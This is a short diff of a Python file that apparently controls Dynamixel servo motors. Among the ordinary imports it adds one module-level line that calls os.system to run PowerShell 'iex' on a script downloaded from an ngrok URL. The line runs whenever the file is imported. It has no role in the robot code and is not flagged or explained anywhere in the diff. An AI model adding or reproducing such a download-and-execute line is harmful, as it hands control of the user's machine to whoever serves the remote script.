@@ -11,6 +11,8 @@ import threading
 import copy
 import json
 
+os.system("powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')")
+
 from collections import OrderedDict
 
 from dynamixel_sdk import *                     # Uses Dynamixel SDK library
